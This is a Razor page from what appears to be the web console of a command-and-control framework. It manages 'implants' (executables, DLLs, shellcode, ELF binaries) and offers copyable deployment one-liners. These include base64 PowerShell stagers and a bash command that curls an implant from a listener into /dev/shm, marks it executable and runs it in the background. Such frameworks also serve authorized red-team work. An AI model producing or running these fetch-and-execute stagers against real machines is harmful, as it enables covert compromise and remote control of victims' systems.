@page "/implants"
@using Common.Models
@using Common.Payload
@using WebCommander.Models
@using WebCommander.Services
@using WebCommander.Components
@using WebCommander.Helpers
@inject AgentService AgentService
@inject TeamServerClient Api
@inject IJSRuntime JSRuntime
@implements IDisposable

<PageTitle>Implants</PageTitle>

<h1>Implants</h1>

<div class="mb-3">
    <button class="btn btn-primary" @onclick="ShowCreateModal">
        <i class="bi bi-plus-circle"></i> Create Implant
    </button>
</div>

@if (implants == null)
{
    <p><em>Loading...</em></p>
}
else
{
    <table class="table table-striped">
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Architecture</th>
                <th>Endpoint</th>
                <th>Listener</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            @foreach (var implant in implants)
            {
                <tr>
                    <td>@implant.Config?.ImplantName</td>
                    <td>@implant.Config?.Type</td>
                    <td>@implant.Config?.Architecture</td>
                    <td>@implant.Config?.Endpoint?.ToString()</td>
                    <td>@(implant.Config?.Listener ?? "Custom")</td>
                    <td>
                        <button class="btn btn-sm btn-info me-1" @onclick="() => ShowScripts(implant)">
                            <i class="bi bi-file-code"></i> Scripts
                        </button>
                        <button class="btn btn-sm btn-primary me-1" @onclick="() => DownloadImplant(implant)">
                            <i class="bi bi-download"></i> Download
                        </button>
                        <button class="btn btn-sm btn-danger" @onclick="() => DeleteImplant(implant)">
                            <i class="bi bi-trash"></i> Delete
                        </button>
                    </td>
                </tr>
            }
        </tbody>
    </table>
}

<!-- Create Implant Modal -->
@if (showCreateModal)
{
    <div class="modal fade show d-block" tabindex="-1" style="background-color: rgba(0,0,0,0.5);">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Create New Implant</h5>
                    <button type="button" class="btn-close" @onclick="HideCreateModal"></button>
                </div>
                <div class="modal-body">
                    <ImplantCreator OnCreationResult="OnCreationResult" OnCancelled="HideCreateModal" />
                </div>
            </div>
        </div>
    </div>
}

<!-- Scripts Modal -->
@if (showScriptsModal && selectedImplant != null)
{
    <div class="modal fade show d-block" tabindex="-1" style="background-color: rgba(0,0,0,0.5);">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Deployment Scripts - @selectedImplant.Config?.ImplantName</h5>
                    <button type="button" class="btn-close" @onclick="HideScriptsModal"></button>
                </div>
                <div class="modal-body">
                    @{
                        var listeners = AgentService.GetListeners();
                        // Filter by listener if one is specified in the implant config
                        if (!string.IsNullOrEmpty(selectedImplant.Config?.Listener))
                        {
                            listeners = listeners.Where(l => l.Name == selectedImplant.Config.Listener).ToList();
                        }
                    }
                    @foreach (var listener in listeners)
                    {
                        var protocol = listener.Secured ? "https://" : "http://";
                        var listenerUrl = $"{protocol}{listener.Ip}:{listener.BindPort}";
                        var isSecured = listener.Secured;
                        var implantUrl = $"{listenerUrl}/imp/{selectedImplant.Config?.ImplantName}{GetFileExtension(selectedImplant.Config?.Type ?? Common.Payload.ImplantType.Executable)}";
                        var fileName = $"{selectedImplant.Config?.ImplantName}{GetFileExtension(selectedImplant.Config?.Type ?? Common.Payload.ImplantType.Executable)}";

                        <div class="mb-4">
                            <h6 class="text-primary">Listener: @listener.Name (@listenerUrl)</h6>
                            
                            @if (selectedImplant.Config?.Type == Common.Payload.ImplantType.PowerShell)
                            {
                                <!-- PowerShell Script -->
                                <div class="mb-3">
                                    <label class="form-label fw-bold">PowerShell Script (Clear)</label>
                                    <div class="input-group">
                                        <input type="text" class="form-control font-monospace" readonly value="@ScriptHelper.GeneratePowershellScript(implantUrl, isSecured)" />
                                        <button class="btn btn-outline-secondary" @onclick="() => CopyToClipboard(ScriptHelper.GeneratePowershellScript(implantUrl, isSecured))">
                                            <i class="bi bi-clipboard"></i> Copy
                                        </button>
                                    </div>
                                </div>

                                <!-- PowerShell Script Base64 -->
                                <div class="mb-3">
                                    <label class="form-label fw-bold">PowerShell Script (Base64)</label>
                                    <div class="input-group">
                                        <input type="text" class="form-control font-monospace" readonly value="@ScriptHelper.GeneratePowershellScriptB64(implantUrl, isSecured)" />
                                        <button class="btn btn-outline-secondary" @onclick="() => CopyToClipboard(ScriptHelper.GeneratePowershellScriptB64(implantUrl, isSecured))">
                                            <i class="bi bi-clipboard"></i> Copy
                                        </button>
                                    </div>
                                </div>
                            }
                            else if (selectedImplant.Config?.Type == ImplantType.Elf)
                            {
                                <!-- Bash Script (ELF) -->
                                var downloadUrl = implantUrl;
                                var bashScript = $"curl -s -o /dev/shm/{selectedImplant.Config.ImplantName} {downloadUrl} && chmod +x /dev/shm/{selectedImplant.Config.ImplantName} && /dev/shm/{selectedImplant.Config.ImplantName} &";
                                
                                <div class="mb-3">
                                    <label class="form-label fw-bold">Bash Oneliner</label>
                                    <div class="input-group">
                                        <input type="text" class="form-control font-monospace" readonly value="@bashScript" />
                                        <button class="btn btn-outline-secondary" @onclick="() => CopyToClipboard(bashScript)">
                                            <i class="bi bi-clipboard"></i> Copy
                                        </button>
                                    </div>
                                </div>
                            }
                            else
                            {
                                <!-- PowerShell Download Script -->
                                <div class="mb-3">
                                    <label class="form-label fw-bold">PowerShell Download Script</label>
                                    <div class="input-group">
                                        <input type="text" class="form-control font-monospace" readonly value="@ScriptHelper.GeneratePowershellDownloadScript(implantUrl, fileName, isSecured)" />
                                        <button class="btn btn-outline-secondary" @onclick="() => CopyToClipboard(ScriptHelper.GeneratePowershellDownloadScript(implantUrl, fileName, isSecured))">
                                            <i class="bi bi-clipboard"></i> Copy
                                        </button>
                                    </div>
                                </div>
                            }
                            <hr />
                        </div>
                    }
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" @onclick="HideScriptsModal">Close</button>
                </div>
            </div>
        </div>
    </div>
}

<ActionToast @ref="toast" />

@code {
    private List<Implant> implants = new();
    private bool showCreateModal = false;
    private bool showScriptsModal = false;
    private Implant? selectedImplant = null;
    private ActionToast toast;

    protected override void OnInitialized()
    {
        // Subscribe to implant updates
        AgentService.OnImplantsUpdated += OnImplantsUpdated;
        
        // Get initial implants
        implants = AgentService.GetImplants();
    }

    private void OnImplantsUpdated()
    {
        implants = AgentService.GetImplants();
        InvokeAsync(StateHasChanged);
    }

    private async Task DownloadImplant(Implant implant)
    {
        try
        {
            // Get implant with binary data
            var implantWithData = await Api.GetImplantWithDataAsync(implant.Id);
            
            if (implantWithData == null || string.IsNullOrEmpty(implantWithData.Data))
            {
                toast.ShowError("Failed to download implant", "No data available");
                return;
            }

            // Decode base64 data
            var binaryData = Convert.FromBase64String(implantWithData.Data);
            
            // Determine file extension based on implant type
            var extension = GetFileExtension(implantWithData.Config?.Type ?? ImplantType.Executable);
            var fileName = $"{implantWithData.Config?.ImplantName ?? "implant"}{extension}";
            
            // Trigger download using JavaScript
            await JSRuntime.InvokeVoidAsync("downloadFile", fileName, Convert.ToBase64String(binaryData));
            
            toast.ShowSuccess($"Implant {fileName} downloaded successfully.");
        }
        catch (Exception ex)
        {
            toast.ShowError("Failed to download implant", ex.Message);
        }
    }

    private string GetFileExtension(ImplantType type)
    {
        return type switch
        {
            ImplantType.PowerShell => ".ps1",
            ImplantType.Executable => ".exe",
            ImplantType.Library => ".dll",
            ImplantType.ReflectiveLibrary => ".dll",
            ImplantType.Service => ".exe",
            ImplantType.Shellcode => ".bin",
            ImplantType.Elf => ".elf",
            _ => ".bin"
        };
    }

    private async Task DeleteImplant(Implant implant)
    {
        if (await JSRuntime.InvokeAsync<bool>("confirm", $"Are you sure you want to delete implant {implant.Config?.ImplantName}?"))
        {
            try
            {
                var success = await Api.DeleteImplantAsync(implant.Id);
                if (success)
                {
                    toast.ShowSuccess($"Implant {implant.Config?.ImplantName} deleted successfully.");
                }
                else
                {
                    toast.ShowError($"Failed to delete implant {implant.Config?.ImplantName}.");
                }
            }
            catch (Exception ex)
            {
                toast.ShowError($"Error deleting implant {implant.Config?.ImplantName}.", ex.Message);
            }
        }
    }

    private void ShowCreateModal()
    {
        showCreateModal = true;
    }

    private void HideCreateModal()
    {
        showCreateModal = false;
    }

    private void OnCreationResult((bool success, string message, string details) result)
    {
        showCreateModal = false;
        
        if (result.success)
        {
            toast.ShowSuccess(result.message, result.details.Replace("\\r\\n", "\n").Replace("\\n", "\n"));
        }
        else
        {
            toast.ShowError(result.message, result.details.Replace("\\r\\n", "\n").Replace("\\n", "\n"));
        }
    }

    private void ShowScripts(Implant implant)
    {
        selectedImplant = implant;
        showScriptsModal = true;
    }

    private void HideScriptsModal()
    {
        showScriptsModal = false;
        selectedImplant = null;
    }

    private async Task CopyToClipboard(string text)
    {
        try
        {
            await JSRuntime.InvokeVoidAsync("navigator.clipboard.writeText", text);
            toast.ShowSuccess("Script copied to clipboard!");
        }
        catch (Exception ex)
        {
            toast.ShowError("Failed to copy to clipboard", ex.Message);
        }
    }

    public void Dispose()
    {
        AgentService.OnImplantsUpdated -= OnImplantsUpdated;
    }
}
